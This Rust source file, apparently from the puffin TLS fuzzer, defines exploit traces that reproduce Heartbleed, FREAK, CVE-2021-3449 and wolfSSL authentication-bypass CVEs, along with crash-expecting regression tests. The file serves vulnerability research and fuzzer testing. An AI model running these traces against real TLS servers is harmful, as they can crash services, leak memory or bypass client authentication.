#![allow(dead_code)]

use puffin::{
    agent::{AgentDescriptor, AgentName, AgentType, TLSVersion},
    algebra::Term,
    term,
    trace::{Action, InputAction, OutputAction, Step, Trace},
};

use crate::{
    query::TlsQueryMatcher,
    tls::{fn_impl::*, rustls::msgs::enums::HandshakeType, seeds::_seed_client_attacker12},
};

/// https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25638
pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_decrypt_handshake(
            ((server, 1)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_1
        )
    };

    let certificate_rsa = term! {
        fn_certificate13(
            (fn_get_context((@certificate_request_message))),
            //fn_empty_certificate_chain
            // Or append eve cert
            (fn_append_certificate_entry(
                (fn_certificate_entry(
                    fn_eve_cert
                )),
              fn_empty_certificate_chain
            ))
        )
    };

    let certificate_verify_rsa = term! {
        fn_certificate_verify(
            (fn_invalid_signature_algorithm),
            // Option 1 (something random, only possible because of fn_empty_certificate_chain, if FAIL_IF_NO_PEER_CERT is unset):
            //fn_eve_cert // or fn_empty_bytes_vec
            // Option 2 (impersonating eve, you have to send eve cert):
            fn_eve_pkcs1_signature
            // Option 3 (for testing):
            /* (fn_rsa_sign_client(
                (fn_certificate_transcript(((server, 0)))),
                fn_eve_private_key, // some random private key
                fn_rsa_pkcs1_signature_algorithm
            ))*/
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@certificate_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                         fn_encrypt_handshake(
                            (@certificate_verify_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1  // sequence 1
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_2  // sequence 2
                        )
                    },
                }),
            },
        ],
    };

    trace
}

/// https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25640
pub fn seed_cve_2022_25640(server: AgentName) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_decrypt_handshake(
            ((server, 1)[Some(TlsQueryMatcher::ApplicationData)]),
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_1
        )
    };

    let certificate = term! {
        fn_certificate13(
            (fn_get_context((@certificate_request_message))),
            (fn_append_certificate_entry(
                (fn_certificate_entry(
                    fn_eve_cert
                )),
              fn_empty_certificate_chain
            ))
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_certificate_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@certificate),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1  // sequence 1
                        )
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TlsQueryMatcher> {
    let (mut trace, client_verify_data) = _seed_client_attacker12(server);

    let renegotiation_client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                (fn_support_group_extension(fn_named_group_secp384r1))
                            )),
                            fn_ec_point_formats_extension
                        )),
                        fn_signed_certificate_timestamp_extension
                    )),
                     // Enable Renegotiation
                    (fn_renegotiation_info_extension((@client_verify_data)))
                )),
                // Add signature cert extension
                fn_signature_algorithm_cert_extension
            ))
        )
    };

    trace.steps.push(Step {
        agent: server,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_encrypt12(
                    (@renegotiation_client_hello),
                    ((server, 0)),
                    (fn_decode_ecdh_pubkey(
                        ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                    )),
                    fn_named_group_secp384r1,
                    fn_true,
                    fn_seq_1
                )
            },
        }),
    });

    /*trace.steps.push(Step {
        agent: server,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_encrypt12(
                    renegotiation_client_hello,
                    ((server, 0)),
                    (fn_decode_ecdh_pubkey(
                        ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                    )),
                    fn_named_group_secp384r1,
                    fn_true,
                    fn_seq_1
                )
            },
        }),
    });*/

    trace
}

pub fn seed_heartbleed(client: AgentName, server: AgentName) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        fn_client_extensions_new,
                        (fn_support_group_extension(fn_named_group_secp384r1))
                    )),
                    fn_ec_point_formats_extension
                )),
                fn_signed_certificate_timestamp_extension
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::new_client(client, TLSVersion::V1_2),
            AgentDescriptor::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_hello,
                }),
            },
            // Send directly after client_hello such that this does not need to be encrypted
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_heartbeat_fake_length(fn_empty_bytes_vec, fn_large_length)
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_freak(client: AgentName, server: AgentName) -> Trace<TlsQueryMatcher> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::new_client(client, TLSVersion::V1_2),
            AgentDescriptor::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        (fn_append_cipher_suite(
                            (fn_new_cipher_suites()),
                            fn_weak_export_cipher_suite
                        )),
                        ((client, 0)),
                        ((client, 0))
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                    fn_server_hello(
                        ((server, 0)),
                        ((server, 0)),
                        ((server, 0)),
                        (fn_secure_rsa_cipher_suite12),
                        ((server, 0)),
                        ((server, 0))
                    )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_certificate(
                            ((server, 0))
                        )
                    },
                }),
            },
            // Server Key Exchange, Server -> Client
            // If the KEX fails here, then no ephemeral KEX is used
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_key_exchange(  // check whether the client rejects this if it does not support export
                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                        )
                    },
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_hello_done
                    },
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_client_key_exchange(
                             ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                        )
                    },
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_change_cipher_spec
                    },
                }),
            },
        ],
    }
}

/// A simplified version of [`seed_cve_2022_25640`]
pub fn seed_cve_2022_25640_simple(server: AgentName) -> Trace<TlsQueryMatcher> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
        ],
    };

    trace
}

#[cfg(test)]
pub mod tests {
    use nix::{
        sys::{
            signal::Signal,
            wait::{
                waitpid, WaitPidFlag,
                WaitStatus::{Exited, Signaled},
            },
        },
        unistd::{fork, ForkResult},
    };

    use crate::{
        put_registry::TLS_PUT_REGISTRY,
        tls::{
            trace_helper::{TraceExecutor, TraceHelper},
            vulnerabilities::*,
        },
    };

    fn expect_crash<R>(mut func: R)
    where
        R: FnMut(),
    {
        match unsafe { fork() } {
            Ok(ForkResult::Parent { child, .. }) => {
                let status = waitpid(child, Option::from(WaitPidFlag::empty())).unwrap();

                if let Signaled(_, signal, _) = status {
                    if signal != Signal::SIGSEGV && signal != Signal::SIGABRT {
                        panic!("Trace did not crash with SIGSEGV/SIGABRT!")
                    }
                } else if let Exited(_, code) = status {
                    if code == 0 {
                        panic!("Trace did not crash exit with non-zero code (AddressSanitizer)!")
                    }
                } else {
                    panic!("Trace did not signal!")
                }
            }
            Ok(ForkResult::Child) => {
                func();
                std::process::exit(0);
            }
            Err(_) => panic!("Fork failed"),
        }
    }

    // Vulnerable up until OpenSSL 1.0.1j
    #[cfg(all(feature = "openssl101-binding", feature = "asan"))]
    #[cfg(feature = "tls12")]
    #[test]
    #[ignore] // We can not check for this vulnerability right now
    fn test_seed_freak() {
        expect_crash(|| {
            seed_freak.execute_trace();
        });
    }

    #[cfg(all(feature = "openssl101-binding", feature = "asan"))]
    #[cfg(feature = "tls12")]
    #[test]
    fn test_seed_heartbleed() {
        expect_crash(|| {
            seed_heartbleed.execute_trace();
        })
    }

    #[test]
    #[cfg(feature = "openssl111j")]
    #[cfg(feature = "tls12")]
    fn test_seed_cve_2021_3449() {
        expect_crash(|| {
            seed_cve_2021_3449.execute_trace();
        });
    }

    #[test]
    #[cfg(feature = "wolfssl510")]
    #[cfg(feature = "tls13")] // require version which supports TLS 1.3
    #[cfg(feature = "client-authentication-transcript-extraction")]
    #[should_panic(expected = "Authentication bypass")]
    fn test_seed_cve_2022_25640() {
        let ctx = seed_cve_2022_25640.execute_trace();
        assert!(ctx.agents_successful());
    }

    #[test]
    #[cfg(feature = "wolfssl510")]
    #[cfg(feature = "tls13")] // require version which supports TLS 1.3
    #[cfg(feature = "client-authentication-transcript-extraction")]
    #[should_panic(expected = "Authentication bypass")]
    fn test_seed_cve_2022_25640_simple() {
        let ctx = seed_cve_2022_25640_simple.execute_trace();
        assert!(ctx.agents_successful());
    }

    #[test]
    #[cfg(feature = "wolfssl510")]
    #[cfg(feature = "tls13")] // require version which supports TLS 1.3
    #[cfg(feature = "client-authentication-transcript-extraction")]
    #[should_panic(expected = "Authentication bypass")]
    fn test_seed_cve_2022_25638() {
        let ctx = seed_cve_2022_25638.execute_trace();
        assert!(ctx.agents_successful());
    }
}
